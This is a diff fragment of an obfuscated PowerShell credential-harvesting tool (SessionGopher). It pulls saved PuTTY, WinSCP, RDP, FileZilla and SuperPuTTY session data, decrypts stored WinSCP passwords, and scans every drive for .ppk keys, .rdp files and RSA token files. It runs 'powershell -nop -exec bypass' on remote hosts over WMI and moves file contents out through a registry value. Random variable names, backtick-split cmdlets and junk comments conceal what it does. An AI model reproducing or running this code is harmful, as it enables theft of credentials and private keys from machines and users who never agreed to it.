+      $novtuvVGrxDTTVCRNsEwoC = ne`w`-`ob`je`ct System.Collections.ArrayList
+      $vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio = ne`w`-`ob`je`ct System.Collections.ArrayList
+      $bVQdQAAqTINLSHvHqjXEZwziqugApeKaNLAuGJkXTzUWY = ne`w`-`ob`je`ct System.Collections.ArrayList
+      $BtUaCCvgPWNHcXFnMqfwlhRaRHPBu = ne`w`-`ob`je`ct System.Collections.ArrayList
+      $ALyYGPldjWMXbilDGXXuwzTiScIOh = ne`w`-`ob`je`ct System.Collections.ArrayList
+      $cTWMuhzRBpgLjOdAEBuayABpY = ne`w`-`ob`je`ct System.Collections.ArrayList
 
-      $DogBoy = (GetMappedSID)
-      $EndClassy = (Hostname) + "\" + (Split-Path $DogBoy.Value -Leaf)
+      $VJDhzOuVcyTmbBVbNFcRKQxmIEDsNJlqKFxIVvnJVptj = (GetMappedSID)
+      $BMsqhbcZYwkwfMupnghp = (Hostname) + "\" + (Split-Path $VJDhzOuVcyTmbBVbNFcRKQxmIEDsNJlqKFxIVvnJVptj.Value -Leaf)
 
-      $BabiesCaring | Add-Member -MemberType NoteProperty -Name "Source" -CanvasStingy $DogBoy.Value
+      $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "Source" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $VJDhzOuVcyTmbBVbNFcRKQxmIEDsNJlqKFxIVvnJVptj.Value
 
       # Microsoft".
-      $FineKnown = Join-Path $TanCurve.PSPath "\$NineReign"
-      $HardDream = Join-Path $TanCurve.PSPath "\$AirFork"
-      $HurryVoyage = Join-Path $TanCurve.PSPath "\$BucketClam"
-      $FileZillaPath = "C:\Users\" + (Split-Path -Leaf $BabiesCaring."Source") + "\AppData\Roaming\FileZilla\sitemanager.xml"
-      $SideKeen = "C:\Users\" + (Split-Path -Leaf $BabiesCaring."Source") + "\Documents\SuperPuTTY\Sessions.xml"
+      $qdBvqVgNPRZmYEkDsaYxARhySNggzttDFBrTXuwL = Join-Path $txgGeZgPwCbJEodqAEpGXCWnFc.PSPath "\$aVjehgNTFEbvQsuPTMIoDonHJjPRXQi"
+      $zDWsbFANxXhtGEFHMWpqStvM = Join-Path $txgGeZgPwCbJEodqAEpGXCWnFc.PSPath "\$JqUcuPbazeouvSZUdWmLHRsvwnOaf"
+      $IPMlLupQlsGXXBuUlXXUhRbAZSS = Join-Path $txgGeZgPwCbJEodqAEpGXCWnFc.PSPath "\$BkGbmSVYcilnyPYKLRRDDRoYXtZmV"
+      $FileZillaPath = "C:\Users\" + (Split-Path -Leaf $tHugALOaXKmLXhgXdEjXRUOG."Source") + "\AppData\Roaming\FileZilla\sitemanager.xml"
+      $eKfJsKaAHeFmEzEghZmLBqOufAuzACssNYaXKsOTYhhL = "C:\Users\" + (Split-Path -Leaf $tHugALOaXKmLXhgXdEjXRUOG."Source") + "\Documents\SuperPuTTY\Sessions.xml"
 
       if (Test-Path $FileZillaPath) {
 
@@ -305,58 +305,58 @@ function Invoke-SessionGopher {
 
       }
 
-      if (Test-Path $SideKeen) {
+      if (Test-Path $eKfJsKaAHeFmEzEghZmLBqOufAuzACssNYaXKsOTYhhL) {
 
-        [xml]$ReturnMarket = Get-Content $SideKeen
-        (ProcessSuperPuTTYFile $ReturnMarket)
+        [xml]$xSUZWiIFWzdJkYAJQeScDzPWnccWPMi = Get-Content $eKfJsKaAHeFmEzEghZmLBqOufAuzACssNYaXKsOTYhhL
+        (ProcessSuperPuTTYFile $xSUZWiIFWzdJkYAJQeScDzPWnccWPMi)
 
       }
 
-      if (Test-Path $HurryVoyage) {
+      if (Test-Path $IPMlLupQlsGXXBuUlXXUhRbAZSS) {
 
         # Microsoft".
-        $LightHorse = Get-ChildItem $HurryVoyage
+        $wnhJBuUaSOFdXzcjoqHLbUhxvFFCSAGeHUfBzE = Get-ChildItem $IPMlLupQlsGXXBuUlXXUhRbAZSS
 
-        (ProcessRDPLocal $LightHorse)
+        (ProcessRDPLocal $wnhJBuUaSOFdXzcjoqHLbUhxvFFCSAGeHUfBzE)
 
       } # Microsoft".
 
-      if (Test-Path $HardDream) {
+      if (Test-Path $zDWsbFANxXhtGEFHMWpqStvM) {
 
         # Microsoft".
-        $LivelyHard = Get-ChildItem $HardDream
+        $FOLhptEooVzDRsgCiQbMuulJMtfvQUPgbDkm = Get-ChildItem $zDWsbFANxXhtGEFHMWpqStvM
 
-        (ProcessWinSCPLocal $LivelyHard)
+        (ProcessWinSCPLocal $FOLhptEooVzDRsgCiQbMuulJMtfvQUPgbDkm)
 
       } # Microsoft".
       
-      if (Test-Path $FineKnown) {
+      if (Test-Path $qdBvqVgNPRZmYEkDsaYxARhySNggzttDFBrTXuwL) {
 
         # Microsoft".
-        $GloveSign = Get-ChildItem $FineKnown
+        $KDkkbfOPgFTEDJyySsRbZ = Get-ChildItem $qdBvqVgNPRZmYEkDsaYxARhySNggzttDFBrTXuwL
 
-        (ProcessPuTTYLocal $GloveSign)
+        (ProcessPuTTYLocal $KDkkbfOPgFTEDJyySsRbZ)
 
       } # Microsoft".
 
     } # Microsoft".
 
     # Microsoft".
-    if ($FoldBlack) {
+    if ($NuFyNRnVcuXYDNHfsgjXUaLp) {
 
       # Microsoft".
-      $MaidMice = new`-ob`je`ct System.Collections.ArrayList
-      $IslandCruel = new`-ob`je`ct System.Collections.ArrayList
-      $RoyalClaim = new`-ob`je`ct System.Collections.ArrayList
+      $vLCzqZfXfTRAtutlzMndAJztthLCt = ne`w`-`ob`je`ct System.Collections.ArrayList
+      $skJFGTkoRQFyjrkRqfHA = ne`w`-`ob`je`ct System.Collections.ArrayList
+      $OjyOLUObkBJstThdcFNXDjmuBpqQSQZAZZ = ne`w`-`ob`je`ct System.Collections.ArrayList
 
       # Microsoft".
-      $SnailSeemly = Get-PSDrive
+      $TRlKxRpNHOmnPCXJJRsaZaGZQEVgo = Get-PSDrive
 
-      (ProcessThoroughLocal $SnailSeemly)
+      (ProcessThoroughLocal $TRlKxRpNHOmnPCXJJRsaZaGZQEVgo)
       
-      (ProcessPPKFile $MaidMice)
-      (ProcessRDPFile $IslandCruel)
-      (ProcesssdtidFile $RoyalClaim)
+      (ProcessPPKFile $vLCzqZfXfTRAtutlzMndAJztthLCt)
+      (ProcessRDPFile $skJFGTkoRQFyjrkRqfHA)
+      (ProcesssdtidFile $OjyOLUObkBJstThdcFNXDjmuBpqQSQZAZZ)
 
     } # Microsoft".
 
@@ -374,18 +374,18 @@ function Invoke-SessionGopher {
 function GetMappedSID {
 
   # Microsoft".
-  if ($TreePlace -or $SheetRecord -or $GustyTricky) {
+  if ($NmhwDRUaDzPVRZKQJZXKDb -or $QonQnbkKcDuNAMTMVVazYCoHlkLaWNiDyaFEuGNnthHnI -or $XYvWFZWJvlMAzGYaPPRjX) {
     # Microsoft".
-    $RuralBest = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$AmuckPlacid"
-    $CanvasStingy = "ProfileImagePath"
+    $tEFuUbQsJcKGTdsqaMJXcQQVKVVqYegiaVJNExAJxpX = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$qHdJtBeluOOwrzppLFhGqwcYNogDLhVOwxVABB"
+    $yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO = "ProfileImagePath"
 
-    return (Invoke-WmiMethod -ComputerName $AbackDesert -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $NightPumped,$RuralBest,$CanvasStingy @optionalCreds).sValue
+    return (Invoke-WmiMethod -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $QMcEPEqyaloTlYTzaWKVWImIMOQVOHUnpyih,$tEFuUbQsJcKGTdsqaMJXcQQVKVVqYegiaVJNExAJxpX,$yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO @optionalCreds).sValue
   # Microsoft".
   } else {
     # Microsoft".
-    $AmuckPlacid = (Split-Path $TanCurve.Name -Leaf)
-    $SolidFixed = new`-ob`je`ct System.Security.Principal.SecurityIdentifier("$AmuckPlacid")
-    return $SolidFixed.Translate( [System.Security.Principal.NTAccount])
+    $qHdJtBeluOOwrzppLFhGqwcYNogDLhVOwxVABB = (Split-Path $txgGeZgPwCbJEodqAEpGXCWnFc.Name -Leaf)
+    $AmCfzxDFnzwwEqtRPtHnsy = ne`w`-`ob`je`ct System.Security.Principal.SecurityIdentifier("$qHdJtBeluOOwrzppLFhGqwcYNogDLhVOwxVABB")
+    return $AmCfzxDFnzwwEqtRPtHnsy.Translate( [System.Security.Principal.NTAccount])
   }
 
 }
@@ -393,32 +393,32 @@ function GetMappedSID {
 function DownloadAndExtractFromRemoteRegistry($File) {
   # Microsoft".
   # Microsoft".
-  $StoveShave = "HKLM:\Software\Microsoft\DRM"
-  $CrossCopy = "ReadMe"
-  $ShapeBad = "SOFTWARE\Microsoft\DRM"
+  $SKAgugSGFARlazkmCozhg = "HKLM:\Software\Microsoft\DRM"
+  $SBfZAZmyhizEaLISypRLGPQilhGzZFyTVXBOYiSmie = "ReadMe"
+  $GOKKfJsrfccPgUwczOdlTVJBTyaBEjwqbgQzPGpO = "SOFTWARE\Microsoft\DRM"
           
   # Microsoft".
   Write-Verbose "Reading remote file and writing on remote registry"
-  $PressDream = '$HeadyBoot = Get-Content -Encoding byte -Path ''' + "$File" + '''; $FuelTrees = [System.Convert]::ToBase64String($HeadyBoot); New-ItemProperty -Path ' + "'$StoveShave'" + ' -Name ' + "'$CrossCopy'" + ' -CanvasStingy $FuelTrees -PropertyType String -Force'
-  $PressDream = 'powershell -nop -exec bypass -c "' + $PressDream + '"'
+  $DAFAlIClaBmCAjzgSOKSptHmBiZtLEcwUzkTw = '$puHjIpXCErqamUgvEWtOqPQoxjVQRklCkSuCT = Get-Content -Encoding byte -Path ''' + "$File" + '''; $qmnsFuEcSkOGPysrzRGcEWwIjfHbAvGqcZGSOhySrzKY = [System.Convert]::ToBase64String($puHjIpXCErqamUgvEWtOqPQoxjVQRklCkSuCT); New-ItemProperty -Path ' + "'$SKAgugSGFARlazkmCozhg'" + ' -Name ' + "'$SBfZAZmyhizEaLISypRLGPQilhGzZFyTVXBOYiSmie'" + ' -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $qmnsFuEcSkOGPysrzRGcEWwIjfHbAvGqcZGSOhySrzKY -PropertyType String -Force'
+  $DAFAlIClaBmCAjzgSOKSptHmBiZtLEcwUzkTw = 'powershell -nop -exec bypass -c "' + $DAFAlIClaBmCAjzgSOKSptHmBiZtLEcwUzkTw + '"'
 
-  $null = Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $PressDream -ComputerName $AbackDesert @optionalCreds
+  $null = Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $DAFAlIClaBmCAjzgSOKSptHmBiZtLEcwUzkTw -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF @optionalCreds
 
   # Microsoft".
   Start-Sleep -s 15
 
-  $StringCrib = ""
+  $AhNtMxKLxLYSBOGGyFlOcroCVcrLFRtEGyxLbSGD = ""
 
   # Microsoft".
-  $StringCrib = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $NightPumped, $ShapeBad, $CrossCopy -Computer $AbackDesert @optionalCreds
+  $AhNtMxKLxLYSBOGGyFlOcroCVcrLFRtEGyxLbSGD = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $QMcEPEqyaloTlYTzaWKVWImIMOQVOHUnpyih, $GOKKfJsrfccPgUwczOdlTVJBTyaBEjwqbgQzPGpO, $SBfZAZmyhizEaLISypRLGPQilhGzZFyTVXBOYiSmie -Computer $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF @optionalCreds
   
-  $PeepHoney = [System.Convert]::FromBase64String($StringCrib.sValue)
-  $TartLove = [System.Text.Encoding]::UTF8.GetString($PeepHoney) 
+  $VojKLbxRilZAzVabaFAhAxN = [System.Convert]::FromBase64String($AhNtMxKLxLYSBOGGyFlOcroCVcrLFRtEGyxLbSGD.sValue)
+  $oqwKCZkUKRRbMktObDjjLWMXwcElTdXHfZNDqXcdoYz = [System.Text.Encoding]::UTF8.GetString($VojKLbxRilZAzVabaFAhAxN) 
     
   # Microsoft".
-  $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $RemoveEmploy, $ShapeBad, $CrossCopy -ComputerName $AbackDesert @optionalCreds
+  $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $BrOVSyCrRyilOliCEiHgmYZLLS, $GOKKfJsrfccPgUwczOdlTVJBTyaBEjwqbgQzPGpO, $SBfZAZmyhizEaLISypRLGPQilhGzZFyTVXBOYiSmie -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF @optionalCreds
   
-  return $TartLove
+  return $oqwKCZkUKRRbMktObDjjLWMXwcElTdXHfZNDqXcdoYz
 
 }
 
@@ -428,17 +428,17 @@ function DownloadAndExtractFromRemoteRegistry($File) {
 # Microsoft".
 # Microsoft".
 
-function ProcessThoroughLocal($SnailSeemly) {
+function ProcessThoroughLocal($TRlKxRpNHOmnPCXJJRsaZaGZQEVgo) {
   
-  foreach ($HomeCurl in $SnailSeemly) {
+  foreach ($caynckokUAyvlTdUigKqVPgJVr in $TRlKxRpNHOmnPCXJJRsaZaGZQEVgo) {
     # Microsoft".
-    if ($HomeCurl.Provider.Name -eq "FileSystem") {
-      $TubDesk = Get-ChildItem $HomeCurl.Root -Recurse -ErrorAction SilentlyContinue
-      foreach ($ManageSmelly in $TubDesk) {
-        Switch ($ManageSmelly.Extension) {
-          ".ppk" {[void]$MaidMice.Add($ManageSmelly)}
-          ".rdp" {[void]$IslandCruel.Add($ManageSmelly)}
-          ".sdtid" {[void]$RoyalClaim.Add($ManageSmelly)}
+    if ($caynckokUAyvlTdUigKqVPgJVr.Provider.Name -eq "FileSystem") {
+      $ZrTrNHuTDbFrLOWYHppzjchtTSW = Get-ChildItem $caynckokUAyvlTdUigKqVPgJVr.Root -Recurse -ErrorAction SilentlyContinue
+      foreach ($lqdoiawDTFBwBHhKTUCnfKMKcjJBUz in $ZrTrNHuTDbFrLOWYHppzjchtTSW) {
+        Switch ($lqdoiawDTFBwBHhKTUCnfKMKcjJBUz.Extension) {
+          ".ppk" {[void]$vLCzqZfXfTRAtutlzMndAJztthLCt.Add($lqdoiawDTFBwBHhKTUCnfKMKcjJBUz)}
+          ".rdp" {[void]$skJFGTkoRQFyjrkRqfHA.Add($lqdoiawDTFBwBHhKTUCnfKMKcjJBUz)}
+          ".sdtid" {[void]$OjyOLUObkBJstThdcFNXDjmuBpqQSQZAZZ.Add($lqdoiawDTFBwBHhKTUCnfKMKcjJBUz)}
         }
       }
     }
@@ -450,272 +450,272 @@ function ProcessThoroughRemote($FilePathsFound) {
 
   foreach ($FilePath in $FilePathsFound) {
       # Microsoft".
-      $WickedCrate = "" | Select-Object -Property Source,Path
-      $WickedCrate.Source = $AbackDesert
+      $giGoVUFnWokjHWoErNuEp = "" | Select-Object -Property Source,Path
+      $giGoVUFnWokjHWoErNuEp.Source = $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF
 
-      $AcidGiddy = [IO.Path]::GetExtension($FilePath.Name)
+      $GizQpeRZckkDqhkapHHLRZCpormsPpt = [IO.Path]::GetExtension($FilePath.Name)
 
-      if ($AcidGiddy -eq ".ppk") {
-        $WickedCrate.Path = $FilePath.Name
-        [void]$DreamExpect.Add($WickedCrate)
-      } elseif ($AcidGiddy -eq ".rdp") {
-        $WickedCrate.Path = $FilePath.Name
-        [void]$JumpySmash.Add($WickedCrate)
-      } elseif ($AcidGiddy -eq ".sdtid") {
-        $WickedCrate.Path = $FilePath.Name
-        [void]$ShopSnow.Add($WickedCrate)
+      if ($GizQpeRZckkDqhkapHHLRZCpormsPpt -eq ".ppk") {
+        $giGoVUFnWokjHWoErNuEp.Path = $FilePath.Name
+        [void]$vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio.Add($giGoVUFnWokjHWoErNuEp)
+      } elseif ($GizQpeRZckkDqhkapHHLRZCpormsPpt -eq ".rdp") {
+        $giGoVUFnWokjHWoErNuEp.Path = $FilePath.Name
+        [void]$ALyYGPldjWMXbilDGXXuwzTiScIOh.Add($giGoVUFnWokjHWoErNuEp)
+      } elseif ($GizQpeRZckkDqhkapHHLRZCpormsPpt -eq ".sdtid") {
+        $giGoVUFnWokjHWoErNuEp.Path = $FilePath.Name
+        [void]$ROkBCNKdDchnbbrBbYFwJJ.Add($giGoVUFnWokjHWoErNuEp)
       }
 
   }
 
-  if ($DreamExpect.count -gt 0) {
+  if ($vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio.count -gt 0) {
 
-    $BabiesCaring | Add-Member -MemberType NoteProperty -Name "PPK Files" -CanvasStingy $JumpySmash
+    $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "PPK Files" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $ALyYGPldjWMXbilDGXXuwzTiScIOh
 
-    if ($BedChunky) {
-      $DreamExpect | Export-CSV -Append -Path ($AdviseRacial + "\PuTTY ppk Files.csv") -NoTypeInformation
+    if ($nFdMHRmJUTihVghjwpEMqoB) {
+      $vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\PuTTY ppk Files.csv") -NoTypeInformation
     } else {
       Write-Output "PuTTY Private Key Files (.ppk)"
-      $DreamExpect | Format-List | Out-String
+      $vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio | Format-List | Out-String
     }
   }
 
-  if ($JumpySmash.count -gt 0) {
+  if ($ALyYGPldjWMXbilDGXXuwzTiScIOh.count -gt 0) {
 
-    $BabiesCaring | Add-Member -MemberType NoteProperty -Name "RDP Files" -CanvasStingy $JumpySmash
+    $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "RDP Files" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $ALyYGPldjWMXbilDGXXuwzTiScIOh
 
-    if ($BedChunky) {
-      $JumpySmash | Export-CSV -Append -Path ($AdviseRacial + "\Microsoft rdp Files.csv") -NoTypeInformation
+    if ($nFdMHRmJUTihVghjwpEMqoB) {
+      $ALyYGPldjWMXbilDGXXuwzTiScIOh | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\Microsoft rdp Files.csv") -NoTypeInformation
     } else {
       Write-Output "Microsoft RDP Connection Files (.rdp)"
-      $JumpySmash | Format-List | Out-String
+      $ALyYGPldjWMXbilDGXXuwzTiScIOh | Format-List | Out-String
     }
   }
-  if ($ShopSnow.count -gt 0) {
+  if ($ROkBCNKdDchnbbrBbYFwJJ.count -gt 0) {
 
-    $BabiesCaring | Add-Member -MemberType NoteProperty -Name "sdtid Files" -CanvasStingy $ShopSnow
+    $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "sdtid Files" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $ROkBCNKdDchnbbrBbYFwJJ
 
-    if ($BedChunky) {
-      $ShopSnow | Export-CSV -Append -Path ($AdviseRacial + "\RSA sdtid Files.csv") -NoTypeInformation
+    if ($nFdMHRmJUTihVghjwpEMqoB) {
+      $ROkBCNKdDchnbbrBbYFwJJ | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\RSA sdtid Files.csv") -NoTypeInformation
     } else {
       Write-Output "RSA Tokens (sdtid)"
-      $ShopSnow | Format-List | Out-String
+      $ROkBCNKdDchnbbrBbYFwJJ | Format-List | Out-String
     }
 
   }
 
 } # Microsoft".
 
-function ProcessPuTTYLocal($GloveSign) {
+function ProcessPuTTYLocal($KDkkbfOPgFTEDJyySsRbZ) {
   
   # Microsoft".
-  foreach($IdeaPedal in $GloveSign) {
+  foreach($jJfvKMjAIHuOyRrBLbIaxRVixJIp in $KDkkbfOPgFTEDJyySsRbZ) {
 
-    $TicketSilk = "" | Select-Object -Property Source,Session,Hostname
+    $WtlaLODdIgPDYiuagmShNMQqmMzmrSofalkeGcXpEFmT = "" | Select-Object -Property Source,Session,Hostname
 
-    $TicketSilk.Source = $EndClassy
-    $TicketSilk.Session = (Split-Path $IdeaPedal -Leaf)
-    $TicketSilk.Hostname = ((Get-ItemProperty -Path ("Microsoft.PowerShell.Core\Registry::" + $IdeaPedal) -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
+    $WtlaLODdIgPDYiuagmShNMQqmMzmrSofalkeGcXpEFmT.Source = $BMsqhbcZYwkwfMupnghp
+    $WtlaLODdIgPDYiuagmShNMQqmMzmrSofalkeGcXpEFmT.Session = (Split-Path $jJfvKMjAIHuOyRrBLbIaxRVixJIp -Leaf)
+    $WtlaLODdIgPDYiuagmShNMQqmMzmrSofalkeGcXpEFmT.Hostname = ((Get-ItemProperty -Path ("Microsoft.PowerShell.Core\Registry::" + $jJfvKMjAIHuOyRrBLbIaxRVixJIp) -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
 
     # Microsoft".
-    [void]$GradeOwn.Add($TicketSilk)
+    [void]$novtuvVGrxDTTVCRNsEwoC.Add($WtlaLODdIgPDYiuagmShNMQqmMzmrSofalkeGcXpEFmT)
 
   }
 
-  if ($BedChunky) {
-    $GradeOwn | Export-CSV -Append -Path ($AdviseRacial + "\PuTTY.csv") -NoTypeInformation
+  if ($nFdMHRmJUTihVghjwpEMqoB) {
+    $novtuvVGrxDTTVCRNsEwoC | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\PuTTY.csv") -NoTypeInformation
   } else {
     Write-Output "PuTTY Sessions"
-    $GradeOwn | Format-List | Out-String
+    $novtuvVGrxDTTVCRNsEwoC | Format-List | Out-String
   }
 
   # Microsoft".
-  $BabiesCaring | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -CanvasStingy $GradeOwn
+  $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $novtuvVGrxDTTVCRNsEwoC
 
 } # Microsoft".
 
-function ProcessRDPLocal($LightHorse) {
+function ProcessRDPLocal($wnhJBuUaSOFdXzcjoqHLbUhxvFFCSAGeHUfBzE) {
 
   # Microsoft".
-  foreach($IdeaPedal in $LightHorse) {
+  foreach($jJfvKMjAIHuOyRrBLbIaxRVixJIp in $wnhJBuUaSOFdXzcjoqHLbUhxvFFCSAGeHUfBzE) {
 
-    $PathToRDPSession = "Microsoft.PowerShell.Core\Registry::" + $IdeaPedal
+    $PathToRDPSession = "Microsoft.PowerShell.Core\Registry::" + $jJfvKMjAIHuOyRrBLbIaxRVixJIp
 
-    $BounceUnit = "" | Select-Object -Property Source,Hostname,Username
+    $UabIWmFwufkgjQPAnNCTULiLofOVGsPZrfjgzI = "" | Select-Object -Property Source,Hostname,Username
 
-    $BounceUnit.Source = $EndClassy
-    $BounceUnit.Hostname = (Split-Path $IdeaPedal -Leaf)
-    $BounceUnit.Username = ((Get-ItemProperty -Path $PathToRDPSession -Name "UsernameHint" -ErrorAction SilentlyContinue).UsernameHint)
+    $UabIWmFwufkgjQPAnNCTULiLofOVGsPZrfjgzI.Source = $BMsqhbcZYwkwfMupnghp
+    $UabIWmFwufkgjQPAnNCTULiLofOVGsPZrfjgzI.Hostname = (Split-Path $jJfvKMjAIHuOyRrBLbIaxRVixJIp -Leaf)
+    $UabIWmFwufkgjQPAnNCTULiLofOVGsPZrfjgzI.Username = ((Get-ItemProperty -Path $PathToRDPSession -Name "UsernameHint" -ErrorAction SilentlyContinue).UsernameHint)
 
     # Microsoft".
-    [void]$ScarfDisarm.Add($BounceUnit)
+    [void]$BtUaCCvgPWNHcXFnMqfwlhRaRHPBu.Add($UabIWmFwufkgjQPAnNCTULiLofOVGsPZrfjgzI)
 
   } # Microsoft".
 
-  if ($BedChunky) {
-    $ScarfDisarm | Export-CSV -Append -Path ($AdviseRacial + "\RDP.csv") -NoTypeInformation
+  if ($nFdMHRmJUTihVghjwpEMqoB) {
+    $BtUaCCvgPWNHcXFnMqfwlhRaRHPBu | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\RDP.csv") -NoTypeInformation
   } else {
     Write-Output "Microsoft Remote Desktop (RDP) Sessions"
-    $ScarfDisarm | Format-List | Out-String
+    $BtUaCCvgPWNHcXFnMqfwlhRaRHPBu | Format-List | Out-String
   }
 
   # Microsoft".
-  $BabiesCaring | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -CanvasStingy $ScarfDisarm
+  $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $BtUaCCvgPWNHcXFnMqfwlhRaRHPBu
 
 } # Microsoft".
 
-function ProcessWinSCPLocal($LivelyHard) {
+function ProcessWinSCPLocal($FOLhptEooVzDRsgCiQbMuulJMtfvQUPgbDkm) {
   
   # Microsoft".
-  foreach($IdeaPedal in $LivelyHard) {
+  foreach($jJfvKMjAIHuOyRrBLbIaxRVixJIp in $FOLhptEooVzDRsgCiQbMuulJMtfvQUPgbDkm) {
 
-    $PathToWinSCPSession = "Microsoft.PowerShell.Core\Registry::" + $IdeaPedal
+    $PathToWinSCPSession = "Microsoft.PowerShell.Core\Registry::" + $jJfvKMjAIHuOyRrBLbIaxRVixJIp
 
-    $StreetClammy = "" | Select-Object -Property Source,Session,Hostname,Username,Password
+    $XLgMsnHgjGNxngdhjsJDumISm = "" | Select-Object -Property Source,Session,Hostname,Username,Password
 
-    $StreetClammy.Source = $EndClassy
-    $StreetClammy.Session = (Split-Path $IdeaPedal -Leaf)
-    $StreetClammy.Hostname = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
-    $StreetClammy.Username = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Username" -ErrorAction SilentlyContinue).Username)
-    $StreetClammy.Password = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Password" -ErrorAction SilentlyContinue).Password)
+    $XLgMsnHgjGNxngdhjsJDumISm.Source = $BMsqhbcZYwkwfMupnghp
+    $XLgMsnHgjGNxngdhjsJDumISm.Session = (Split-Path $jJfvKMjAIHuOyRrBLbIaxRVixJIp -Leaf)
+    $XLgMsnHgjGNxngdhjsJDumISm.Hostname = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
+    $XLgMsnHgjGNxngdhjsJDumISm.Username = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Username" -ErrorAction SilentlyContinue).Username)
+    $XLgMsnHgjGNxngdhjsJDumISm.Password = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Password" -ErrorAction SilentlyContinue).Password)
 
-    if ($StreetClammy.Password) {
-      $DollStain = ((Get-ItemProperty -Path (Join-Path $TanCurve.PSPath "SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security") -Name "UseMasterPassword" -ErrorAction SilentlyContinue).UseMasterPassword)
+    if ($XLgMsnHgjGNxngdhjsJDumISm.Password) {
+      $DzkJihLBUKqMjcDFcYdQZojZfg = ((Get-ItemProperty -Path (Join-Path $txgGeZgPwCbJEodqAEpGXCWnFc.PSPath "SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security") -Name "UseMasterPassword" -ErrorAction SilentlyContinue).UseMasterPassword)
 
       # Microsoft".
-      if (!$DollStain) {
-          $StreetClammy.Password = (DecryptWinSCPPassword $StreetClammy.Hostname $StreetClammy.Username $StreetClammy.Password)
+      if (!$DzkJihLBUKqMjcDFcYdQZojZfg) {
+          $XLgMsnHgjGNxngdhjsJDumISm.Password = (DecryptWinSCPPassword $XLgMsnHgjGNxngdhjsJDumISm.Hostname $XLgMsnHgjGNxngdhjsJDumISm.Username $XLgMsnHgjGNxngdhjsJDumISm.Password)
       # Microsoft".
       } else {
-          $StreetClammy.Password = "Saved in session, but master password prevents plaintext recovery"
+          $XLgMsnHgjGNxngdhjsJDumISm.Password = "Saved in session, but master password prevents plaintext recovery"
       }
     }
 
     # Microsoft".
-    [void]$SparkDry.Add($StreetClammy)
+    [void]$NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF.Add($XLgMsnHgjGNxngdhjsJDumISm)
 
   } # Microsoft".
 
-  if ($BedChunky) {
-    $SparkDry | Export-CSV -Append -Path ($AdviseRacial + "\WinSCP.csv") -NoTypeInformation
+  if ($nFdMHRmJUTihVghjwpEMqoB) {
+    $NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\WinSCP.csv") -NoTypeInformation
   } else {
     Write-Output "WinSCP Sessions"
-    $SparkDry | Format-List | Out-String
+    $NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF | Format-List | Out-String
   }
 
   # Microsoft".
-  $BabiesCaring | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -CanvasStingy $SparkDry
